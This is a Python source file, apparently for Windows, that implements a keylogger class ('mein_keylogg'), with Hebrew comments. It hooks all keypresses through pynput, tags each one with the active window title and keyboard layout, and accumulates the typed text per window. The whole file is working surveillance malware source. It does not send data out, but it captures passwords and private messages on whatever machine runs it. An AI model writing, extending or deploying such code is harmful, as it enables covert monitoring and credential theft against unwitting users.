from abc import ABC, abstractmethod
from typing import List
import win32gui
from pynput.keyboard import Listener
import win32api


class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass

    @abstractmethod
    def stop_logging(self) -> None:
        pass

    @abstractmethod
    def get_logged_keys(self) -> List[str]:
        pass


class mein_keylogg(IKeyLogger):

    def __init__(self):
        self.listener = None
        self.logged_keys = []


    def _get_active_window_title(self) -> str:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)

    def _add_key_and_window(self, event: str) -> None:
        window_title = self._get_active_window_title()
        language_id = win32api.GetKeyboardLayoutName() # מקבלים את שם השפה

        try:
            # **שינוי חשוב כאן!**  אנחנו שומרים גם את השפה במילון
            if 'text' in self.logged_keys[-1][window_title]:
                self.logged_keys[-1][window_title]['text'] += event
            else:
                self.logged_keys[-1][window_title]['text'] = event
                self.logged_keys[-1][window_title]['language'] = language_id # **שומרים את השפה כאן!**
        except:
            self.logged_keys.append({window_title: {'text': event, 'language': language_id}}) # **וגם כאן!**

        print(type(event))
        print(self.logged_keys)

    def _on_key_press(self, key) -> None:
        try:
            key = key.char
        except AttributeError:
            key = str(key)
        keys_dict = {
            "Key.alt": "(*alt*)",
            "Key.alt_l": "(*alt_l*)",
            "Key.alt_r": "(*alt_r*)",
            "Key.alt_gr": "(*alt_gr*)",
            "Key.backspace": "\b",
            "Key.caps_lock": "(*caps_lock*)",
            "Key.cmd": "(*cmd*)",
            "Key.cmd_l": "(*cmd_l*)",
            "Key.cmd_r": "(*cmd_r*)",
            "Key.ctrl": "(*ctrl*)",
            "Key.ctrl_l": "(*ctrl_l*)",
            "Key.ctrl_r": "(*ctrl_r*)",
            "Key.delete": "(*delete*)",
            "Key.down": "(*down*)",
            "Key.end": "(*end*)",
            "Key.enter": "\n",
            "Key.esc": "(*esc*)",
            "Key.f1": "(*f1*)",
            "Key.f2": "(*f2*)",
            "Key.f3": "(*f3*)",
            "Key.f4": "(*f4*)",
            "Key.f5": "(*f5*)",
            "Key.f6": "(*f6*)",
            "Key.f7": "(*f7*)",
            "Key.f8": "(*f8*)",
            "Key.f9": "(*f9*)",
            "Key.f10": "(*f10*)",
            "Key.f11": "(*f11*)",
            "Key.f12": "(*f12*)",
            "Key.f13": "(*f13*)",
            "Key.f14": "(*f14*)",
            "Key.f15": "(*f15*)",
            "Key.f16": "(*f16*)",
            "Key.f17": "(*f17*)",
            "Key.f18": "(*f18*)",
            "Key.f19": "(*f19*)",
            "Key.f20": "(*f20*)",
            "Key.home": "(*home*)",
            "Key.left": "(*left*)",
            "Key.page_down": "(*page_down*)",
            "Key.page_up": "(*page_up*)",
            "Key.right": "(*right*)",
            "Key.shift": "(*shift*)",
            "Key.shift_l": "(*shift_l*)",
            "Key.shift_r": "(*shift_r*)",
            "Key.space": " ",
            "Key.tab": "\t",
            "Key.up": "(*up*)",
            "Key.media_play_pause": "(*media_play_pause*)",
            "Key.media_volume_mute": "(*media_volume_mute*)",
            "Key.media_volume_down": "(*media_volume_down*)",
            "Key.media_volume_up": "(*media_volume_up*)",
            "Key.media_previous": "(*media_previous*)",
            "Key.media_next": "(*media_next*)",
            "Key.insert": "(*insert*)",
            "Key.menu": "(*menu*)",
            "Key.num_lock": "(*num_lock*)",
            "Key.pause": "(*pause*)",
            "Key.print_screen": "(*print_screen*)",
            "Key.scroll_lock": "(*scroll_lock*)"
        }
        key = keys_dict.get(key, key)
        self._add_key_and_window(key)

    def start_logging(self) -> None:
        self.listener = Listener(on_press=self._on_key_press)
        self.listener.start()

    def stop_logging(self) -> None:
        if self.listener:
            self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        return self.logged_keys



